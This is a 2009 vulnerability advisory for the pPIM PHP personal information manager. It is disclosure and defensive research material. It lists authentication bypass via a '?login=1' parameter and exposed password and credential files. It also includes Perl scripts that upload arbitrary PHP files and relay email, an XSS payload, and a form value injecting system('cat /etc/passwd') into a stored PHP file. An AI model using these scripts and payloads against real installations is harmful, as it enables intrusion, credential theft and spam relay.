@@ -1,0 +1,219 @@
+- -= pPIM Multiple Vulnerabilities =-
+
+Version Tested:  pPIM 1.0
+Vendor notified
+Full details can also be found at http://www.lampsecurity.org/node/18
+Author: Justin C. Klein Keane <justin@madirish.net>
+
+Description
+
+pPIM (http://www.phlatline.org/index.php?page=prod-ppim) is a Personal
+Information Management application written in PHP that can store
+contacts (including their photos), events, links, notes, send and check
+email, and upload files.  pPIM came to my attention recently with the
+publishing on Milw0rm of exploit code designed to facilitate remote
+command execution (http://www.milw0rm.com/exploits/8093).  As there is a
+milw0rm exploit already posted it is likely malicious users are already
+exploiting pPIM.  I decided to have a closer look at pPIM and, quite
+frankly, was horrified by what I found.  pPIM contains multiple
+vulnerabilities, from version information leakage, to system credential
+disclosure, to remote command execution, authentication bypass and cross
+site scripting vulnerabilities.  Possibly the only class of
+vulnerability pPIM is not exposed to is SQL injection as it doesn't
+employ any database back end.  That said, there seemed to be nothing in
+the way of security other than an easily bypassable GET variable check
+in the header, present in pPIM.  The following is a brief synopsis of my
+findings, although I gave up investigation at after discovering so many
+flaws in the application's architecture with respect to security.
+
+Version Information Leakage:
+
+By calling the URL http://target.tld/ppim/Readme.txt you can view the
+version information of the installed version of pPIM.
+
+Password Hash Disclosure:
+
+By requesting the URL http://target.tld/ppim/password.dat the password
+hash is revealed.  Depending on the hashing algorithm used by PHP this
+could be trivially easy to compromise using a password cracking tool
+like John the Ripper.
+
+Unauthenticated Password Change:
+
+There is no authentication protection on the password changing script,
+so calling
+
+http://target.tld/ppim/changepassword.php
+
+will present an attacker with the password change script and allow
+password reset without confirming the existing password.
+
+Multiple Authentication Problems:
+
+Because the authentication takes place in templates/header.html in an
+embedded piece of PHP code, depending on server configuration, this code
+might not be executed.  Unless the web server is specifically configured
+to execute PHP embeded in HTML files server site the PHP code will
+instead simply be passed back to clients as actual HTML.
+
+Authentication bypass is possible by simply appending the GET variable
+'login=1' to the URL.  For example, to access the Calendar page, calling
+the URL 'http://target.tld/ppim/calendar.php' will redirect the
+unauthenticated user to the login page.  However, calling the URL
+'http://target.tld/ppim/calendar.php?login=1' will allow unauthenticated
+access to the Calendar.  Any of the pages in pPIM can be accessed this way.
+
+Arbitrary File Upload
+
+pPIM's upload.php script allows attackers to upload arbitrary scripts of
+any type to the target server.  To do this using Perl simply create the
+file and upload it using Perl:
+
+$ echo "<?php echo phpinfo();?>" > phpinfo.php
+
+The execute the following Perl script:
+
+#!/usr/bin/perl
+#
+# pPIM Uploader by Justin C. Klein Keane <justin@lampsecurity.org>
+# Used to upload the file phpinfo.php to a target pPIM site
+# bypassing authentication.
+#
+# Feb 24, 2009
+#
+use LWP::UserAgent;
+use HTTP::Request::Common qw(POST);
+
+$ua = LWP::UserAgent->new();
+$request = HTTP::Request->new();
+
+$response = $ua->request( POST 'http://target.tld/ppim/upload.php?login=1',
+        Content_Type => 'form-data',
+        Content =>
+        [
+                'submitupload' => 'submitupload',
+                'userfile' => ['./info.php']
+        ],
+);
+die "Error: ", $response->status_line unless $response->is_success;
+
+Unauthorized Email Relay
+
+pPIM's sendmail.php script has absolutely no authentication or
+validation, allowing anyone with access to the site to relay e-mail.
+The following Perl script will relay email through the pPIM installation:
+
+#!/usr/bin/perl
+#
+# pPIM Mailer by Justin C. Klein Keane <justin@lampsecurity.org>
+# Used to relay mail through any pPIM installation
+#
+# Feb 24, 2009
+#
+use LWP::UserAgent;
+use HTTP::Request::Common qw(POST);
+
+$ua = LWP::UserAgent->new();
+$request = HTTP::Request->new();
+
+$response = $ua->request( POST 'http://target.tld/ppim/sendmail.php',
+        Content_Type => 'form-data',
+        Content =>
+        [
+                'submitemail' => 'submitemail',
+                'to' => 'root@localhost',
+                'from' => 'root@localhost',
+                'message' => 'You are just asking for spam!'
+        ],
+);
+die "Error: ", $response->status_line unless $response->is_success;
+
+Posting Unauthenticated Notes
+
+The notes.php script fails to check authentication before inserting new
+notes.  This allows attackers to post notes without even having to
+bypass authentication.  Similarly no authentication is required to
+delete notes, allowing unauthenticated attackers to clear all stored notes.
+
+XSS Vulnerability
+
+None of the form fields seem to be adequately scrubbed to prevent Cross
+Site Scripting (XSS).  This vulnerability is endemic throughout the
+application.  For instance, creating a note with the title
+"<script>alert('foo');</script>" causes a JavaScript alert box to pop up
+the word "foo" whenever the Notes screen is accessed.
+
+System Credential Exposure
+
+Because the Email function stores mailbox information as a flat file it
+is easy to disclose system account information.  For instance, in pPIM,
+if I were to create a new mailbox for root a file called "root.email"
+would be created in the email folder.  By calling the URL
+http://target.tld/ppim/email/root.email the following output is exposed
+via web browser:
+
+<?php
+$mailserver = "localhost";
+$username = "root";
+$password = "root_password";
+?>
+
+Thus an attacker that can enumerate (or guess) user accounts for
+mailboxes set up via pPIM can easily disclose server location as well as
+usernames and passwords. This vulnerability affects all data stored in
+pPIM - it can be accessed directly via URL call without any form of
+authentication and will expose any material stored in pPIM to users
+without authentication.
+
+Arbitrary Command Execution
+
+By creating a specially crafted link an attacker can run arbitrary
+commands with the privileges of the web server process.  By altering the
+URL field of a link the data files created can be manipulated.  Under
+normal usage a user can create a new link under a group, say the
+'test_group' with the name 'testlink', the URL '192.168.0.1' and the
+description 'test description'.  This file is then stored in pPIM's root
+directory under the links/test_group/ directory as testlink.link.
+Viewing this file we see:
+
+$ cat testlink.link
+<?php
+$url="192.168.0.52";
+$name="test link";
+$description="This is the test link";
+?>
+
+This file is included as a PHP include when the note is rendered.
+Rudimentary JavaScript provides client side validation of input data,
+but if an attacker arbitrarily submitted a form with the following data:
+
+linkname=evil_link&linkurl=";$url=system('cat
+/etc/passwd');$foo="&linkdescription=test2&groupname=test+group&linksubmit=Make+Link
+
+The URL variable is overwritten with injected definition.  Looking at
+the evil_link.link file created on the filesystem we see:
+
+$ cat evil_link.link
+<?php
+$url="";$url=system('cat /etc/passwd');$foo="";
+$name="evil_link";
+$description="test2";
+?>
+
+Thus we have arbitrarily overwritten the $url variable and assigned it
+the value that returns from the output of our system call.  In fact, now
+when a user viewed the Links page they could read the /etc/passwd file
+via a web browser.
+
+Conclusions:
+
+I stopped poking at pPIM after gleaning these details as it became
+abundantly clear that the application is thoroughly riddled with holes.
+ pPIM fails to enforce any security in it's code, and deploying the
+application produces a gaping hole in the security of any host.
+
+Recommendations:
+
+Uninstall pPIM immediately!
+
+# milw0rm.com [2009-02-25]
